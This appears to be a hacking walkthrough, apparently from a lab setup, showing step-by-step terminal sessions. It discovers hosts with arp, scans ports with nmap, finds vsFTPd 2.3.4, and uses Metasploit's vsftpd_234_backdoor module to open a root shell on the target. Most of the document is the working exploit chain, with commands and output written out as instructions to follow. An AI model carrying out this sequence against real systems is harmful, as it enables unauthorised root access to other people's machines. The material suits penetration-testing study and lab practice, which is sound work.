1. After your laptop is on the same network you can check for your neighbors with : arp -a


clandestine@Xena:~$ arp -a
_gateway (192.168.50.1) at dc:a6:32:74:05:36 [ether] on eno1
NAS181D4C.fritz.box (10.xx.yy.3) at 24:5e:be:18:1d:4c [ether] on wlp2s0
fritz.box (10.xx.yy.1) at 0c:72:74:46:20:d5 [ether] on wlp2s0




2. Next check for open ports on that IP:  nmap 192.168.50.1



clandestina@Xena:~$ nmap 192.168.50.1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-01 21:17 CET
Nmap scan report for _gateway (192.168.50.1)
Host is up (0.0029s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds


3. FTP should be investigated deeper: ftp 192.168.50.1

clandestine@Xena:~$ ftp 192.168.50.1
Connected to 192.168.50.1.
220 (vsFTPd 2.3.4)
Name (192.168.50.1:christina): 



4. Usually you would check the internet for exploits. Lets cut corners and start Metasploit and do :search vsftpd


clandestine@Xena:~$ msfconsole 
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
Metasploit tip: After running db_nmap, be sure to check out the result 
of hosts and services
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.4.88-dev-                               ]
+ -- --=[ 2,556 exploits - 1,310 auxiliary - 1,680 payloads     ]
+ -- --=[ 431 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search vsftp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf > use 1
[*] No payload configured, defaulting to cmd/unix/interact
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS = 192.168.50.1
RHOSTS => = 192.168.50.1
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.50.1:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.50.1:21 - USER: 331 Please specify the password.
[+] 192.168.50.1:21 - Backdoor service has been spawned, handling...
[+] 192.168.50.1:21 - UID: uid=0(root) gid=0(root) Gruppen=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.50.2:39271 -> 192.168.50.1:6200) at 2026-01-01 21:18:04 +0100

ls
bin
boot
dev
etc
home
lib
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
w
 23:11:17 up 5 min,  0 users,  load average: 0,00, 0,01, 0,00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
^C
Abort session 1? [y/N]  y

[*] 192.168.50.1 - Command shell session 1 closed.  Reason: User exit
msf exploit(unix/ftp/vsftpd_234_backdoor) > 










